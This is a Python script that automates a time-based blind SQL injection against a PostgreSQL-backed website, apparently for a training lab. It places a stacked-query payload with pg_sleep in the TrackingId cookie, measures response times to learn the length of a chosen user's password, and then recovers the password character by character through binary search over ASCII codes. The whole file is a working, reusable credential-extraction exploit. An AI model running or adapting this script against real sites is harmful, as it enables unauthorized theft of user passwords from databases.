import requests

url = input("Input URL: ")
Session = input("Input session: ")
TrackingId = input("Input TrackingID: ")
username = input("Input username: ")

#keep alive
SESSION = requests.Session()
#BKTT
cookies = {
    "TrackingId": TrackingId,
    "Session": Session,
}

###

def blindsql(condition: str) -> bool:
    # Nếu tên đăng nhập là {username} VÀ điều kiện kiểm tra
    # {condition} đúng, hãy tạm dừng 4 giây (pg_sleep(4)), 
    # ngược lại không dừng (pg_sleep(0))
    #=> CASE WHEN ... THEN ... ELSE ... END ... --
    payload = (
        f"{TrackingId}'%3BSELECT+CASE+WHEN+(username='{username}'+AND+"
        f"({condition}))+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
    )
    #copy cookie
    current_cookies = cookies.copy()
    #payload -> TrackingId
    current_cookies["TrackingId"] = payload

    try:
        # HTTP GET -> URL just wait for 10s
        response = SESSION.get(url, cookies=current_cookies, timeout=10)
        # >=4s is true (pg_sleep(4) - payload)
        if response.elapsed.total_seconds() >= 4:
            return True
    except requests.exceptions.RequestException:
        pass
        
    return False

###
#MAX 50 char, TYPE HINTING: int
def find_length(max_len=50) -> int:

    #range(start, stop + 1) -> range(1, 51)
    for n in range(1, max_len + 1):

        # is lenght = n?
        if blindsql(f"LENGTH(password)={n}"):
            return n
        #True return lenght
    raise RuntimeError("??? WTF if LENgth???")

###=============================================================
# lo is " " and 126 is "~" 

def find_char_binary(position: int, lo=32, hi=126) -> str:
    #ASCII 32-126 (a-z 0-9 and "[]{},./?';)

    while lo < hi: # => lo == hi #!!!

        # (32 + 126) :/ 2 
        mid = (lo + hi) // 2

        # is position is more than mid? TRUE/FALSE
        # SUBSTRING(password, {position}, 1) => position n, 1passwd
        # ASCII(...)
        # > {mid}
        
        if blindsql(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
            lo = mid + 1 # >50 or >n
            
        else:
            hi = mid # <50 or <n

    return chr(lo)   #!!!

###=============================================================

def extract_password(length: int) -> str:
    result = ""

    for pos in range(1, length + 1):
        ch = find_char_binary(pos)#position
        result += ch

        print(f"Position {pos}: {ch} -> Current password: {result}")
    return result

###

if __name__ == "__main__":
    print("Start...")
    #main is running
    try:
        # n = function
        n = find_length()
        print(f"Lenght Password: {n}")
        # pass = function
        password = extract_password(n)
        print(f"Password of {username}: {password}")

    #ERROR
    except Exception as e:
        print(f"Error: {e}")